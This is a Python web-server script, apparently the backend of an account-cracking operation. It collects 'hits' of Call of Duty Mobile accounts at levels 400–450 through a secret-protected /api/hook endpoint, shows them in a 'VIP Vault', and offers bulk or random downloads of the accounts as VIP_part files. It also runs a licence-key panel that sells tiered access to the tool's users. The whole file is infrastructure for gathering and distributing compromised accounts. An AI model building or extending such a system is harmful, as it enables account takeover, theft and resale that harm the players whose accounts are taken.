#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""STORM x GOJI ROUTER — VIP vault 400-450 + /api/hook."""
from __future__ import annotations
import hmac, json, os, random, secrets, socket, time, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, Optional
import sg_shared as S

SESSIONS: Dict[str, dict] = {}

def page(title, body, active=""):
    def L(h, l, k):
        return f'<a class="{" active" if active==k else ""}" href="{h}">{l}</a>'
    nav = ('<nav class="nav"><span class="brand">STORM × GOJI · ROUTER</span>'
           + L("/", "Vault", "vault") + L("/keys", "Keys", "keys") + L("/generate", "Generate", "gen") + L("/monitor", "Monitor", "mon")
           + L("/logout", "Logout", "") + "</nav>")
    return f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>{S.esc(title)} · ROUTER</title><style>{S.CSS}</style></head><body>
{nav}<main class="wrap">{body}</main>
<footer>ROUTER · VIP 400–450 · durable with DATA_DIR</footer></body></html>""".encode()

class Handler(BaseHTTPRequestHandler):
    server_version = "StormRouter/3"
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): return
    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        try:
            if isinstance(body, str): body = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.send_header("Cache-Control", "no-store")
            if extra:
                for k,v in extra.items(): self.send_header(k, str(v))
            self.end_headers(); self.wfile.write(body)
        except Exception: pass
    def _redirect(self, loc):
        try:
            self.send_response(302); self.send_header("Location", loc)
            self.send_header("Content-Length","0"); self.end_headers()
        except Exception: pass
    def _cookie(self):
        out = {}
        for p in (self.headers.get("Cookie") or "").split(";"):
            p=p.strip()
            if "=" in p:
                k,v=p.split("=",1); out[k.strip()]=v.strip()
        return out
    def _session(self):
        return SESSIONS.get(self._cookie().get("sg_r_sid") or "")
    def _require(self):
        s=self._session()
        if s and s.get("role") in ("admin","storm_master","goji_master"): return True
        self._redirect("/login"); return False
    def _set_session(self, role):
        sid=secrets.token_hex(16); SESSIONS[sid]={"role":role,"ts":time.time()}
        try:
            self.send_response(302); self.send_header("Location","/")
            self.send_header("Set-Cookie", f"sg_r_sid={sid}; Path=/; HttpOnly; SameSite=Strict; Max-Age=86400")
            self.send_header("Content-Length","0"); self.end_headers()
        except Exception: pass
    def _body(self):
        try: n=int(self.headers.get("Content-Length") or 0)
        except Exception: n=0
        if n<=0 or n>2_000_000: return b""
        try: return self.rfile.read(n)
        except Exception: return b""
    def _json(self):
        try:
            d=json.loads(self._body().decode("utf-8","ignore") or "{}")
            return d if isinstance(d, dict) else {}
        except Exception: return {}

    def do_GET(self):
        try:
            u=urllib.parse.urlparse(self.path)
            path=u.path or "/"; qs=urllib.parse.parse_qs(u.query or "")
            if path=="/api/health":
                return self._send(200, b'{"ok":true,"service":"router"}', "application/json")
            if path=="/login": return self._login()
            if path=="/logout":
                sid=self._cookie().get("sg_r_sid")
                if sid: SESSIONS.pop(sid, None)
                try:
                    self.send_response(302); self.send_header("Location","/login")
                    self.send_header("Set-Cookie","sg_r_sid=; Path=/; Max-Age=0")
                    self.send_header("Content-Length","0"); self.end_headers()
                except Exception: pass
                return
            if path in ("/","/vault"): return self._vault(qs)
            if path in ("/keys","/panel","/generate","/users"):
                return self._panel_proxy(path, qs)
            if path=="/monitor": return self._monitor()
            if path=="/download": return self._dl(qs, False)
            if path=="/download/random": return self._dl(qs, True)
            return self._send(404, page("404", "<h1>Not found</h1>"))
        except Exception as e:
            return self._send(500, page("Error", f"<h1>Error</h1><p class='hint'>{S.esc(e)}</p>"))

    def do_POST(self):
        try:
            path=urllib.parse.urlparse(self.path).path or "/"
            if path=="/login": return self._login_post()
            if path=="/api/hook": return self._hook()
            if path=="/api/key/status": return self._key_status()
            return self._send(404, b'{"ok":false}', "application/json")
        except Exception:
            return self._send(500, b'{"ok":false}', "application/json")

    def _login(self, err=""):
        flash=f'<div class="flash bad">{S.esc(err)}</div>' if err else ""
        body=f"""<h1>Router gate</h1><section class="card">{flash}
        <form method="post" action="/login">
          <label>Master key</label>
          <input name="key" type="password" required autofocus/>
          <button class="btn-mg" type="submit">Enter vault</button>
        </form></section>"""
        self._send(200, page("Login", body))
    def _login_post(self):
        form={k:v[0] for k,v in urllib.parse.parse_qs(self._body().decode("utf-8","ignore"), keep_blank_values=True).items()}
        key=(form.get("key") or "").strip().upper().replace(" ","")
        if key==S.MASTER_STORM:
            S.log_event("router_login",{"role":"storm_master"}); return self._set_session("storm_master")
        if key==S.MASTER_GOJI:
            S.log_event("router_login",{"role":"goji_master"}); return self._set_session("goji_master")
        return self._login("Access denied")

    def _vault(self, qs):
        if not self._require(): return
        hits=S.load_hits(); total=len(hits)
        rows=[]
        for h in hits[:300]:
            rows.append(
                f"<tr><td class='mono'>{S.esc(h.get('account'))}</td>"
                f"<td><b style='color:var(--mg)'>{S.esc(h.get('codm_level'))}</b></td>"
                f"<td>{S.esc(h.get('codm_region') or '—')}</td>"
                f"<td>{S.esc(h.get('shell_balance') or 0)}</td>"
                f"<td class='muted'>{S.esc(str(h.get('hooked_at') or '')[:19])}</td>"
                f"<td class='muted'>{S.esc(h.get('hook_source') or '')}</td></tr>")
        table="".join(rows) or "<tr><td colspan='6' class='muted'>No VIP hooks yet</td></tr>"
        dc=min(50, max(total,1))
        body=f"""
        <h1><span class="live-dot"></span>VIP Vault <span class="tag">400–450</span></h1>
        <section class="card">
          <div class="grid">
            <div class="stat"><b>{total}</b><span>Elite hits</span></div>
            <div class="stat"><b>{min(300,total)}</b><span>Showing</span></div>
          </div>
          <h2>Download</h2>
          <form method="get" action="/download" style="display:flex;flex-wrap:wrap;gap:.7rem;align-items:end">
            <div style="flex:1;min-width:110px"><label>How many</label>
              <input type="number" name="count" min="1" value="{dc}"/></div>
            <div style="flex:1;min-width:110px"><label>Per VIP_part</label>
              <input type="number" name="per" min="1" max="500" value="50"/></div>
            <button class="btn-mg" type="submit">Download</button>
            <a class="btn" href="/download/random?count=25&per=50">Random 25</a>
            <a class="btn" href="/download?count={max(total,1)}&per=50">All</a>
          </form>
        </section>
        <section class="card">
          <div class="table-wrap"><table>
            <thead><tr><th>Account</th><th>Lv</th><th>Region</th><th>Shell</th><th>Hooked</th><th>Src</th></tr></thead>
            <tbody>{table}</tbody></table></div>
          <p class="hint"><a class="btn" href="/">Refresh</a></p>
        </section>"""
        self._send(200, page("VIP Vault", body, "vault"))

    def _dl(self, qs, rnd=False):
        if not self._require(): return
        hits=S.load_hits()
        try: count=int((qs.get("count") or ["50"])[0])
        except Exception: count=50
        try: per=int((qs.get("per") or ["50"])[0])
        except Exception: per=50
        if not hits: return self._send(200, page("Empty","<h1>No hits</h1>"))
        count=max(1,min(count,len(hits))); per=max(1,min(per,500))
        selected=random.sample(hits, min(count,len(hits))) if rnd else hits[:count]
        parts=S.build_vip_parts(selected, per_file=per)
        if not parts: return self._send(200, page("Empty","<h1>No hits</h1>"))
        if len(parts)==1:
            n,c=parts[0]
            return self._send(200, c.encode(), "text/plain; charset=utf-8",
                              {"Content-Disposition": f'attachment; filename="{n}"'})
        try:
            import io, zipfile
            buf=io.BytesIO()
            with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
                for n,c in parts: zf.writestr(n,c)
            return self._send(200, buf.getvalue(), "application/zip",
                              {"Content-Disposition": 'attachment; filename="VIP_parts.zip"'})
        except Exception:
            blob="\n\n".join(f"##### {n} #####\n{c}" for n,c in parts)
            return self._send(200, blob.encode(), "text/plain; charset=utf-8",
                              {"Content-Disposition": 'attachment; filename="VIP_parts.txt"'})

    def _monitor(self):
        if not self._require(): return
        rows=[]
        for e in S.read_events(100):
            if e.get("kind") not in ("vip_hook","router_login"): continue
            rows.append(
                f"<tr><td class='muted'>{S.esc(e.get('ts'))}</td>"
                f"<td><span class='tag'>{S.esc(e.get('kind'))}</span></td>"
                f"<td class='mono'>{S.esc(e.get('account') or e.get('key') or '—')}</td>"
                f"<td class='muted'>{S.esc(e.get('level') or e.get('hook_source') or '')}</td></tr>")
        table="".join(rows) or "<tr><td colspan='4' class='muted'>No events</td></tr>"
        body=f"""<h1><span class="live-dot"></span>Monitor</h1>
        <section class="card"><div class="table-wrap"><table>
          <thead><tr><th>Time</th><th>Event</th><th>Account</th><th>Meta</th></tr></thead>
          <tbody>{table}</tbody></table></div>
          <p class="hint"><a class="btn" href="/monitor">Refresh</a></p></section>"""
        self._send(200, page("Monitor", body, "mon"))

    def _hook(self):
        secret=self.headers.get("X-Router-Secret") or self.headers.get("x-router-secret") or ""
        if not hmac.compare_digest(str(secret), str(S.ROUTER_API_SECRET)):
            return self._send(403, b'{"ok":false,"error":"forbidden"}', "application/json")
        data=self._json()
        try: lvl=int(data.get("codm_level") or 0)
        except Exception: lvl=0
        if lvl<400 or lvl>450:
            return self._send(200, b'{"ok":true,"stored":false,"reason":"out_of_band"}', "application/json")
        if not data.get("account"):
            return self._send(400, b'{"ok":false}', "application/json")
        try: S.append_hit(data)
        except Exception:
            return self._send(500, b'{"ok":false}', "application/json")
        return self._send(200, b'{"ok":true,"stored":true}', "application/json")

    def _key_status(self):
        secret = self.headers.get("X-Router-Secret") or self.headers.get("x-router-secret") or ""
        if secret and not hmac.compare_digest(str(secret), str(S.ROUTER_API_SECRET)):
            return self._send(403, b'{"ok":false}', "application/json")
        data = self._json()
        key = (data.get("key") or "").strip().upper().replace(" ", "")
        device = (data.get("device_id") or "").strip()
        if not key:
            return self._send(200, b'{"ok":true,"allowed":true}', "application/json")
        # masters always
        if key in (S.MASTER_STORM, S.MASTER_GOJI):
            return self._send(200, b'{"ok":true,"allowed":true,"role":"master"}', "application/json")
        db = S.load_db()
        if key in db.get("revoked", []):
            return self._send(200, b'{"ok":true,"allowed":false,"reason":"revoked"}', "application/json")
        if device and device in db.get("banned_devices", []):
            return self._send(200, b'{"ok":true,"allowed":false,"reason":"device_banned"}', "application/json")
        rec = db.get("keys", {}).get(key)
        if rec is None:
            # portable offline keys may not be in cloud DB yet — allow
            return self._send(200, b'{"ok":true,"allowed":true,"reason":"unknown_local"}', "application/json")
        if rec.get("banned"):
            return self._send(200, b'{"ok":true,"allowed":false,"reason":"banned"}', "application/json")
        exp = rec.get("expires_at")
        if exp and S.parse_iso(exp) and S.parse_iso(exp) < S.now():
            return self._send(200, b'{"ok":true,"allowed":false,"reason":"expired"}', "application/json")
        try:
            S.touch_session(key, device)
        except Exception:
            pass
        return self._send(200, b'{"ok":true,"allowed":true}', "application/json")


    def _panel_proxy(self, path, qs):
        """Lightweight key admin on same host (Render single service)."""
        if not self._require():
            return
        db = S.load_db()
        if path == "/generate" and (qs.get("action") == ["new"] or True):
            # show generate form via GET amount unit
            unit = (qs.get("unit") or ["day"])[0]
            try: amount = int((qs.get("amount") or ["1"])[0])
            except Exception: amount = 1
            try: max_d = int((qs.get("max_devices") or ["1"])[0])
            except Exception: max_d = 1
            if qs.get("go") == ["1"]:
                expires = S.parse_duration(unit, amount)
                key = S.make_portable_key(expires)
                db.setdefault("keys", {})[key] = {
                    "created_at": S.iso(S.now()), "expires_at": expires, "device_id": None,
                    "devices": [], "max_devices": max(1, min(10, max_d)),
                    "banned": False, "note": "", "label": "USER", "tier": "user",
                    "max_level": 399, "portable": True, "last_seen": None,
                }
                S.save_db(db)
                S.log_event("key_generate", {"key": key})
                flash = f'<div class="flash ok mono">{S.esc(key)}</div>'
            else:
                flash = ""
            body = f"""<h1>Generate</h1><section class="card">{flash}
              <form method="get" action="/generate">
                <input type="hidden" name="go" value="1"/>
                <label>Unit</label><select name="unit">
                  <option>minute</option><option>hour</option><option selected>day</option>
                  <option>week</option><option>month</option><option>year</option><option>lifetime</option>
                </select>
                <label>Amount</label><input name="amount" type="number" value="1"/>
                <label>Max devices</label><input name="max_devices" type="number" value="1"/>
                <button class="btn-mg" type="submit">Generate</button>
              </form></section>
              <p class="hint"><a class="btn" href="/keys">Keys</a> <a class="btn" href="/">Vault</a></p>"""
            return self._send(200, page("Generate", body))
        # keys list + actions
        msg = (qs.get("msg") or [""])[0]
        flash = f'<div class="flash ok">{S.esc(msg)}</div>' if msg else ""
        action = (qs.get("action") or [""])[0]
        key_q = (qs.get("key") or [""])[0].strip().upper()
        if action and key_q:
            if action == "revoke":
                if key_q not in db.get("revoked", []): db.setdefault("revoked", []).append(key_q)
                db.get("keys", {}).pop(key_q, None)
                S.log_event("key_revoke", {"key": key_q}); msg = "revoked"
            elif action == "ban":
                rec = db.get("keys", {}).get(key_q)
                if rec:
                    rec["banned"] = True
                    db["keys"][key_q] = rec
                    S.log_event("key_ban", {"key": key_q}); msg = "banned"
            elif action == "unban":
                rec = db.get("keys", {}).get(key_q)
                if rec:
                    rec["banned"] = False
                    db["keys"][key_q] = rec
                    msg = "unbanned"
            elif action == "kick":
                rec = db.get("keys", {}).get(key_q)
                if rec:
                    rec["device_id"] = None
                    rec["devices"] = []
                    db["keys"][key_q] = rec
                    msg = "kicked"
            S.save_db(db)
            return self._redirect("/keys?msg=" + urllib.parse.quote(msg))
        rows = []
        for k, rec in list(db.get("keys", {}).items())[:300]:
            if not isinstance(rec, dict): continue
            st = S.session_status(rec)
            enc = urllib.parse.quote(k, safe="")
            rows.append(
                f"<tr><td class='mono'>{S.esc(k)}</td><td><span class='tag'>{st}</span></td>"
                f"<td class='muted'>{S.esc((rec.get('expires_at') or 'LIFE')[:19])}</td>"
                f"<td class='actions'>"
                f"<a class='btn' href='/keys?action=kick&key={enc}'>Kick</a> "
                f"<a class='btn-bad' href='/keys?action=ban&key={enc}'>Ban</a> "
                f"<a class='btn' href='/keys?action=unban&key={enc}'>Unban</a> "
                f"<a class='btn-bad' href='/keys?action=revoke&key={enc}'>Revoke</a></td></tr>"
            )
        table = "".join(rows) or "<tr><td colspan='4' class='muted'>No keys — use Generate</td></tr>"
        body = f"""<h1>Keys</h1>{flash}
        <p class="hint"><a class="btn-mg" href="/generate">Generate</a> <a class="btn" href="/">Vault</a></p>
        <section class="card"><div class="table-wrap"><table>
          <thead><tr><th>Key</th><th>Status</th><th>Expires</th><th>Actions</th></tr></thead>
          <tbody>{table}</tbody></table></div></section>"""
        return self._send(200, page("Keys", body))


def main():
    S.ensure_admin()
    host=os.environ.get("HOST","0.0.0.0")
    ports=[]
    for k in ("ROUTER_PORT","PORT"):
        if os.environ.get(k):
            try: ports.append(int(os.environ[k]))
            except Exception: pass
    ports += [8080,8090,8088,9090]
    seen=set(); ports=[p for p in ports if not (p in seen or seen.add(p))]
    ThreadingHTTPServer.allow_reuse_address=True
    httpd=None; bound=None
    for port in ports:
        try:
            httpd=ThreadingHTTPServer((host,port), Handler)
            try: httpd.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except Exception: pass
            bound=port; break
        except OSError: continue
    if not httpd:
        print("ROUTER bind failed", flush=True); return
    print("STORM × GOJI · ROUTER", flush=True)
    print(f"  http://0.0.0.0:{bound}", flush=True)
    print(f"  login: {S.MASTER_GOJI}", flush=True)
    try: httpd.serve_forever()
    except KeyboardInterrupt: print("\nstopped")

if __name__=="__main__":
    main()
